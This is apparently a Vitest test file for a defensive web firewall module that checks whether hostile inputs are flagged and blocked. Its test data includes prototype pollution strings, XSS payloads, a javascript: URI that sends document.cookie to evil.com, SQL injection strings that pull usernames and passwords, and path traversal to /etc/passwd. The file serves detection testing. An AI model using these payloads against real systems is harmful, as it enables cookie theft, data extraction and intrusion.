import { describe, it, expect, beforeEach } from "vitest";
import {
  hexstrikeInspect,
  hexstrikeSanitizeRoute,
  getHexStrikeWafAuditLog,
  clearHexStrikeWafAuditLog,
} from "@/engine/hexstrike-waf";

describe("HexStrike AI Serverless Defensive Firewall (WAF)", () => {
  beforeEach(() => {
    clearHexStrikeWafAuditLog();
  });

  describe("Prototype Pollution Defense", () => {
    it("detects direct __proto__ injection attempts", () => {
      const res = hexstrikeInspect("/api/config?__proto__[admin]=true");
      expect(res.safe).toBe(false);
      expect(res.threats.some(t => t.category === "PROTOTYPE_POLLUTION")).toBe(true);
      expect(res.severity).toBe("critical");
    });

    it("detects constructor.prototype manipulation", () => {
      const res = hexstrikeInspect("constructor['prototype']['polluted']=1");
      expect(res.safe).toBe(false);
      expect(res.threats.some(t => t.category === "PROTOTYPE_POLLUTION")).toBe(true);
    });

    it("detects __defineGetter__ and __lookupSetter__ exploits", () => {
      const res1 = hexstrikeInspect("/data?lookup=__defineGetter__");
      const res2 = hexstrikeInspect("/data?lookup=__lookupSetter__");
      expect(res1.safe).toBe(false);
      expect(res2.safe).toBe(false);
    });
  });

  describe("Cross-Site Scripting (XSS) Defense", () => {
    it("detects explicit <script> tags", () => {
      const res = hexstrikeInspect("<script>alert('xss')</script>");
      expect(res.safe).toBe(false);
      expect(res.threats.some(t => t.category === "CROSS_SITE_SCRIPTING")).toBe(true);
      expect(res.severity).toBe("critical");
    });

    it("detects inline DOM event handlers (onerror, onload, onclick)", () => {
      const res1 = hexstrikeInspect('<img src="x" onerror="stealCookie()" />');
      const res2 = hexstrikeInspect('<body onload=alert(1)>');
      expect(res1.safe).toBe(false);
      expect(res2.safe).toBe(false);
    });

    it("detects javascript: and data: pseudo-protocol URIs", () => {
      const res1 = hexstrikeInspect("javascript:fetch('https://evil.com/'+document.cookie)");
      const res2 = hexstrikeInspect("data:text/html;base64,PHNjcmlwdD4=");
      expect(res1.safe).toBe(false);
      expect(res2.safe).toBe(false);
    });
  });

  describe("SQL Injection (SQLi) Defense", () => {
    it("detects UNION SELECT query exfiltration", () => {
      const res = hexstrikeInspect("1' UNION SELECT username, password FROM users--");
      expect(res.safe).toBe(false);
      expect(res.threats.some(t => t.category === "SQL_INJECTION")).toBe(true);
    });

    it("detects tautological boolean bypasses (' OR '1'='1')", () => {
      const res = hexstrikeInspect("admin' OR '1'='1");
      expect(res.safe).toBe(false);
      expect(res.threats.some(t => t.category === "SQL_INJECTION")).toBe(true);
    });
  });

  describe("Directory & Path Traversal Defense", () => {
    it("detects ../ and encoded %2e%2e%2f path traversal sequences", () => {
      const res1 = hexstrikeInspect("../../../etc/passwd");
      const res2 = hexstrikeInspect("..%2f..%2fconfig.json");
      expect(res1.safe).toBe(false);
      expect(res1.threats.some(t => t.category === "PATH_TRAVERSAL")).toBe(true);
      expect(res2.safe).toBe(false);
    });
  });

  describe("Route Sanitization & Edge Shield Invariants", () => {
    it("permits standard clean application routes", () => {
      const res = hexstrikeSanitizeRoute("/dashboard");
      expect(res.blocked).toBe(false);
      expect(res.safeRoute).toBe("/dashboard");
    });

    it("permits nested routes with valid alphanumeric parameters", () => {
      const res = hexstrikeSanitizeRoute("/library/deck-123");
      expect(res.blocked).toBe(false);
      expect(res.safeRoute).toBe("/library/deck-123");
    });

    it("evicts malicious routing attempts to root ('/') and marks them blocked", () => {
      const res = hexstrikeSanitizeRoute("/__proto__/dashboard");
      expect(res.blocked).toBe(true);
      expect(res.safeRoute).toBe("/");
    });

    it("sanitizes dangerous symbols and deduplicates consecutive slashes", () => {
      const res = hexstrikeSanitizeRoute("///portfolio///view?tag=<script>");
      expect(res.blocked).toBe(true); // script tag triggers block
      expect(res.safeRoute).toBe("/");
    });

    it("appends intercepted security events to the in-memory WAF audit log", () => {
      hexstrikeSanitizeRoute("/numera?eval=__proto__");
      const logs = getHexStrikeWafAuditLog();
      expect(logs.length).toBeGreaterThan(0);
      expect(logs[0].threats.some(t => t.category === "PROTOTYPE_POLLUTION")).toBe(true);
      expect(logs[0].action).toBe("BLOCKED");
    });
  });
});

